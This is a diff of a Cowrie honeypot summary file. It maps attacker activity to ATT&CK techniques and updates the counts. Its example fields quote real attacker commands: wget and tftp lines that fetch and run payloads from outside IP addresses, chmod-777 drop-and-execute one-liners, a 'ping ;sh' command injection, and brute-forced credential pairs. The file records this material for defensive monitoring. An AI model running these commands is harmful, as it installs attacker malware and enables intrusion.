@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-11 22:05:10",
+  "generated": "2026-09-11 23:01:13",
   "totals": {
-    "commands": 10770,
-    "login_failed": 8235,
-    "login_success": 3487,
-    "sessions": 8715
+    "commands": 10805,
+    "login_failed": 8253,
+    "login_success": 3489,
+    "sessions": 8740
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 8235,
+      "count": 8253,
       "examples": [
         "mathieu / mathieu",
         "mathieu / mathieu1",
@@ -21,14 +21,14 @@
         "mathieu / mathieu12345"
       ],
       "first": "2026-09-11T00:11:12.668081Z",
-      "last": "2026-09-11T22:04:04.374421Z",
-      "unique_ips": 105
+      "last": "2026-09-11T23:00:14.766495Z",
+      "unique_ips": 108
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 3487,
+      "count": 3489,
       "examples": [
         "ubuntu / ubuntu",
         "root / 1001chin",
@@ -37,14 +37,14 @@
         "ftpuser / ftpuser"
       ],
       "first": "2026-09-11T00:12:50.249197Z",
-      "last": "2026-09-11T22:02:53.150600Z",
-      "unique_ips": 79
+      "last": "2026-09-11T22:50:46.608684Z",
+      "unique_ips": 81
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 202,
+      "count": 217,
       "examples": [
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
         ">/var/d && chmod 777 /var/d && /var/d && cd /var/",
@@ -53,14 +53,14 @@
         ">/dev/d && chmod 777 /dev/d && /dev/d && cd /dev/"
       ],
       "first": "2026-09-11T01:59:03.804170Z",
-      "last": "2026-09-11T21:27:37.476976Z",
-      "unique_ips": 21
+      "last": "2026-09-11T22:34:06.163170Z",
+      "unique_ips": 22
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 65,
+      "count": 68,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t",
@@ -69,8 +69,8 @@
         "/bin/busybox wget http://100.70.48.197:7069/lvn3/eU -O /dev/.none ; cat /dev/.none ; rm /dev/.none ; /bin/busybox ORsuav"
       ],
       "first": "2026-09-11T01:59:05.375558Z",
-      "last": "2026-09-11T21:27:37.476976Z",
-      "unique_ips": 19
+      "last": "2026-09-11T22:34:06.163170Z",
+      "unique_ips": 20
     },
     {
       "id": "T1082",
@@ -92,15 +92,15 @@
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 16,
+      "count": 17,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "id",
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
       ],
       "first": "2026-09-11T01:59:05.375558Z",
-      "last": "2026-09-11T21:26:46.072996Z",
-      "unique_ips": 16
+      "last": "2026-09-11T22:33:14.241861Z",
+      "unique_ips": 17
     },
     {
       "id": "T1059.004",
@@ -243,19 +243,19 @@
   "unmapped": [
     [
       "shell",
-      3395
+      3397
     ],
     [
       "sh",
-      3395
+      3397
     ],
     [
       "system",
-      3361
+      3363
     ],
     [
       "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
-      83
+      91
     ],
     [
       "/bin/busybox LZRD",
@@ -275,7 +275,7 @@
     ],
     [
       "enable",
-      19
+      20
     ],
     [
       "/bin/busybox",
@@ -283,23 +283,23 @@
     ],
     [
       "linuxshell",
-      15
+      16
     ],
     [
       "cd /proc && cat self/cmdline",
-      14
+      15
     ],
     [
       "ping ;sh",
-      14
+      15
     ],
     [
       "enablelinuxshell",
-      13
+      14
     ],
     [
       "/bin/busybox UNSTABLE",
-      5
+      6
     ],
     [
       "/bin/busybox ORsuavM2",
